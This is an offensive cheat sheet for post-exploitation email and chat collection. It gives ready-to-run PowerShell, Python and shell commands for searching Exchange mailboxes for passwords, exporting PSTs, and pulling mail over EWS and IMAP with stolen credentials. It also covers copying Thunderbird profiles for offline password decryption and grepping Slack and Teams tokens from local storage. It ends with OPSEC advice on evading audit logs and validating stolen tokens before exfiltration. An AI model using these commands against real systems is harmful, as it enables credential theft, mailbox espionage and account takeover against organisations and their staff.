# Email Collection Reference

## Exchange / Outlook / O365

### MailSniper (PowerShell)

```powershell
# https://github.com/dafthack/MailSniper
Import-Module .\MailSniper.ps1

# Search your own mailbox (requires valid creds)
Invoke-SelfSearch -Mailbox user@corp.com -ExchHostname mail.corp.com \
  -Terms "password","credentials","vpn","secret"

# Global search (requires ApplicationImpersonation role)
Invoke-GlobalMailSearch -ImpersonationAccount admin@corp.com \
  -ExchHostname mail.corp.com -Terms "password","vpn" \
  -OutputCsv results.csv

# Enumerate the Global Address List
Get-GlobalAddressList -ExchHostname mail.corp.com \
  -UserName corp\user -Password Pass123

# Enumerate mailbox folders
Invoke-OpenInboxFinder -ExchHostname mail.corp.com \
  -EmailList emails.txt
```

### Exchange Management Shell (On-Server)

```powershell
# Export mailbox to PST (requires Mailbox Import Export role)
New-MailboxExportRequest -Mailbox "user@corp.com" -FilePath "\\server\share\user.pst"
Get-MailboxExportRequest | Get-MailboxExportRequestStatistics

# Search specific mailboxes
Search-Mailbox -Identity "user@corp.com" -SearchQuery 'subject:"password"' \
  -TargetMailbox "admin@corp.com" -TargetFolder "SearchResults"

# Get mailbox statistics (size/item count)
Get-MailboxStatistics -Identity "user@corp.com"

# List all mailboxes
Get-Mailbox -ResultSize Unlimited | Select-Object DisplayName,PrimarySmtpAddress
```

### EWS (Exchange Web Services) — Python

```python
# Using exchangelib
from exchangelib import Credentials, Account
creds = Credentials('corp\\user', 'Password123')
account = Account('user@corp.com', credentials=creds, autodiscover=True)
for item in account.inbox.all().order_by('-datetime_received')[:50]:
    print(item.subject, item.sender, item.text_body[:200])

# Download attachments
for item in account.inbox.filter(has_attachments=True):
    for attachment in item.attachments:
        with open(attachment.name, 'wb') as f:
            f.write(attachment.content)
```

---

## IMAP Collection

### curl

```bash
# List mailboxes
curl -k "imaps://mail.target.com/" --user "user:password"

# List messages in INBOX
curl -k "imaps://mail.target.com/INBOX" --user "user:password"

# Download specific message by UID
curl -k "imaps://mail.target.com/INBOX;UID=1" --user "user:password" -o msg1.eml

# Search for messages
curl -k "imaps://mail.target.com/INBOX?SUBJECT password" --user "user:password"
```

### Python imaplib

```python
import imaplib, email
M = imaplib.IMAP4_SSL('mail.target.com')
M.login('user@target.com', 'password')
M.select('INBOX')
typ, data = M.search(None, 'ALL')
for num in data[0].split()[-20:]:  # last 20 messages
    typ, msg_data = M.fetch(num, '(RFC822)')
    msg = email.message_from_bytes(msg_data[0][1])
    print(f"From: {msg['from']} Subject: {msg['subject']}")
M.logout()
```

---

## Thunderbird Profile Theft

```bash
# Profile locations:
# Linux:   ~/.thunderbird/
# Windows: %APPDATA%\Thunderbird\Profiles\
# macOS:   ~/Library/Thunderbird/Profiles/

# Key files:
#   logins.json        — saved IMAP/SMTP passwords (encrypted)
#   key4.db            — encryption key database
#   cert9.db           — certificates
#   prefs.js           — server configs, account names
#   *.msf              — mail summary files (message index)
#   ImapMail/          — cached IMAP messages
#   Mail/              — local POP mail

# Exfiltrate entire profile
tar czf /tmp/.tb.tgz ~/.thunderbird/
# Then decrypt offline with firefox_decrypt (same NSS format)
python3 firefox_decrypt.py -p /path/to/thunderbird/profile/
```

---

## PST File Collection

```powershell
# Find PST files on disk
dir /s /b C:\Users\*.pst 2>nul
Get-ChildItem -Path C:\Users -Recurse -Filter "*.pst" -ErrorAction SilentlyContinue

# Common PST locations:
# C:\Users\<user>\Documents\Outlook Files\
# C:\Users\<user>\AppData\Local\Microsoft\Outlook\

# OST files (offline cache — convert with tools like Kernel OST Viewer)
dir /s /b C:\Users\*.ost 2>nul
```

---

## Slack / Teams Token Extraction

```bash
# Slack tokens (xoxs-, xoxp-, xoxb-, xoxr-)
# Linux:
strings ~/.config/Slack/Local\ Storage/leveldb/*.ldb 2>/dev/null | grep -oE "xox[bpsr]-[a-zA-Z0-9-]+"

# Windows:
findstr /si "xoxs- xoxp- xoxb-" "%APPDATA%\Slack\Local Storage\leveldb\*.ldb"

# Teams tokens (JWT format — eyJ...)
# Windows:
findstr /si "eyJ0" "%APPDATA%\Microsoft\Teams\Local Storage\leveldb\*.ldb"
# Or from Cookies file:
findstr /si "eyJ0" "%APPDATA%\Microsoft\Teams\Cookies"

# Validate token
curl -s -H "Authorization: Bearer xoxp-TOKEN" https://slack.com/api/auth.test
```

---

## OPSEC Notes

- **MailSniper:** Generates Exchange audit logs; Invoke-GlobalMailSearch is very noisy
- **EWS/IMAP:** Authentication attempts logged; use harvested creds, not brute force
- **PST export:** Creates MailboxExportRequest entries visible to Exchange admins
- **Slack tokens:** Long-lived; validate before exfil to avoid wasting bandwidth on expired tokens
- **Size consideration:** Mailboxes can be huge — search and filter before exporting entire mailboxes
